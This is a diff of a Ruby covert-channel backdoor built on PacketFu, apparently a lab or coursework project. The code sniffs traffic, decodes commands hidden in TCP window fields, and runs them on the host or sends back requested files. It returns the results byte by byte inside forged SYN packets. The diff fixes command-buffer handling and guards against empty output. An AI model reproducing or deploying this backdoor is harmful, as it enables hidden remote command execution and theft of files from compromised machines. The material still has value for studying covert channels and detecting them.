@@ -29,7 +29,7 @@ def listen()
 
 	cap = PacketFu::Capture.new(:iface => @options[:iface], :start => true, :filter => @options[:filter], :promisc => true)
 	command = nil
-
+    commands = nil
 	cap.stream.each do | pkt |
 
 		if PacketFu::TCPPacket.can_parse?(pkt) then
@@ -38,13 +38,17 @@ def listen()
     
 				# if a FIN comes in then we have our complete command
 				if packet.tcp_flags.fin == 1 then
+                    puts command
                     commands = command.split(' ')
 
                     if commands[0] == "get" then
                         send_file(commands[1], packet)
+                        command = nil
                     else
                         exec_command(command, packet)
+
 				    end
+				    command = nil  
 				else #not a fin packet recieved
 					if command.nil? then
 						command = decode(packet.tcp_win)
@@ -83,6 +87,7 @@ def exec_command(command, packet)
 	  
 	#send result back to client
 	send_data(result, packet)
+	
 	listen()
 	
 end
@@ -94,7 +99,7 @@ end
 # -----------------------------------------------------------------------------------------
 
 def send_file(filename, packet)
-    
+
     if File.exist?(filename) then
         file = File.open(filename, "rb")
         content = file.read
@@ -119,17 +124,19 @@ end
 def send_data(string, packet)
 
 	pkt = PacketFu::TCPPacket.new
-    puts string
-	#send the data
-	string.each_byte do |char|
-	    pkt.eth_saddr = @options[:ifconfig][:eth_saddr]				
-		pkt.ip_daddr = packet.ip_saddr #the servers ip
-		pkt.ip_saddr = packet.ip_daddr #the senders ip
 
-		pkt.tcp_flags = PacketFu::TcpFlags.new(:syn => 1)	
-		pkt.tcp_win = char
-		pkt.recalc
-		pkt.to_w(@options[:iface])
+	#send the data
+	unless string.nil? 
+	    string.each_byte do |char|
+	        pkt.eth_saddr = @options[:ifconfig][:eth_saddr]				
+		    pkt.ip_daddr = packet.ip_saddr #the servers ip
+		    pkt.ip_saddr = packet.ip_daddr #the senders ip
+
+		    pkt.tcp_flags = PacketFu::TcpFlags.new(:syn => 1)	
+		    pkt.tcp_win = char
+		    pkt.recalc
+		    pkt.to_w(@options[:iface])
+	    end
 	end
 	
 	#send a FIN to indicate completion
